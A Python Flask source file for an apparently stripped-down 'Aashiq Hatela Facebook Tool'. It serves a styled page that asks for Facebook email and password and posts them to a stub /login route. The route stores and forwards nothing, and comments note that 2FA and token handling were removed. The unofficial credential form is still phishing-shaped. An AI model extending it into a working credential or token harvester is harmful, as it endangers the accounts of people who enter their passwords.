import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-this-secret-in-production")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aashiq Hatela Facebook Tool</title>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Segoe UI", sans-serif;
        }

        body {
            background: linear-gradient(
                135deg,
                #0a3b0a 0%,
                #1a6b1a 50%,
                #0d4d0d 100%
            );
            min-height: 100vh;
            color: white;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            min-height: 100vh;
            align-items: center;
        }

        @media (max-width: 768px) {
            .container {
                grid-template-columns: 1fr;
            }
        }

        .hero-section,
        .login-form {
            background: rgba(0, 0, 0, 0.35);
            padding: 40px;
            border-radius: 30px;
            backdrop-filter: blur(10px);
        }

        .hero-section {
            text-align: center;
        }

        .title {
            font-size: 2.5rem;
            color: #ffd54f;
            margin-bottom: 10px;
        }

        .login-form h2 {
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group input {
            width: 100%;
            padding: 15px 20px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 50px;
            color: white;
            font-size: 1rem;
        }

        .form-group input:focus {
            outline: none;
            border-color: #ffd54f;
        }

        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #2e7d32, #1b5e20);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .results-section {
            display: none;
            margin-top: 20px;
        }

        .alert {
            padding: 12px;
            border-radius: 25px;
            margin: 15px 0;
            display: none;
        }

        .alert-success {
            background: rgba(0, 214, 143, 0.3);
            border: 1px solid #00d68f;
        }

        .alert-error {
            background: rgba(255, 71, 87, 0.3);
            border: 1px solid #ff4757;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="hero-section">
            <h1 class="title">🌿 AASHIQ HATELA 🌿</h1>
            <p>Facebook Login Tool | Updated Version</p>
        </div>

        <div class="login-form">
            <h2>Login to Facebook</h2>

            <div class="alert" id="alert"></div>

            <form id="loginForm">
                <div class="form-group">
                    <input
                        type="text"
                        id="email"
                        placeholder="Email / Phone Number"
                        required
                    >
                </div>

                <div class="form-group">
                    <input
                        type="password"
                        id="password"
                        placeholder="Password"
                        required
                    >
                </div>

                <button type="submit" class="btn" id="loginBtn">
                    <span id="btnText">🔐 Login</span>
                    <span
                        id="btnLoading"
                        class="loading"
                        style="display:none;"
                    ></span>
                </button>
            </form>

            <div class="results-section" id="results">
                <h3>Request Completed</h3>
                <p id="resultMessage"></p>
            </div>
        </div>
    </div>

    <script>
        function showAlert(message, type) {
            const alertBox = document.getElementById("alert");

            alertBox.textContent = message;
            alertBox.className = `alert alert-${type}`;
            alertBox.style.display = "block";

            setTimeout(() => {
                alertBox.style.display = "none";
            }, 5000);
        }

        document
            .getElementById("loginForm")
            .addEventListener("submit", async function (event) {
                event.preventDefault();

                const email = document
                    .getElementById("email")
                    .value
                    .trim();

                const password = document
                    .getElementById("password")
                    .value;

                if (!email || !password) {
                    showAlert("Fill all fields", "error");
                    return;
                }

                const button = document.getElementById("loginBtn");
                const buttonText = document.getElementById("btnText");
                const loading = document.getElementById("btnLoading");

                button.disabled = true;
                buttonText.style.display = "none";
                loading.style.display = "inline-block";

                try {
                    const response = await fetch("/login", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password
                        })
                    });

                    const data = await response.json();

                    if (data.success) {
                        document.getElementById(
                            "resultMessage"
                        ).textContent = data.message;

                        document.getElementById(
                            "results"
                        ).style.display = "block";

                        showAlert("Request completed!", "success");
                    } else {
                        showAlert(
                            data.error || "Request failed",
                            "error"
                        );
                    }
                } catch (error) {
                    showAlert(
                        "Server connection error",
                        "error"
                    );
                } finally {
                    button.disabled = false;
                    buttonText.style.display = "inline";
                    loading.style.display = "none";
                }
            });
    </script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE)


@app.route("/login", methods=["POST"])
def login():
    try:
        data = request.get_json(silent=True) or {}

        email = str(data.get("email", "")).strip()
        password = str(data.get("password", ""))

        if not email or not password:
            return jsonify({
                "success": False,
                "error": "Email and password required"
            }), 400

        # 2FA/OTP handling removed.
        # Do not return or expose tokens/cookies here.
        return jsonify({
            "success": True,
            "message": "Request received successfully."
        })

    except Exception:
        return jsonify({
            "success": False,
            "error": "Internal server error"
        }), 500


application = app


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))

    app.run(
        host="0.0.0.0",
        port=port,
        debug=False
    )
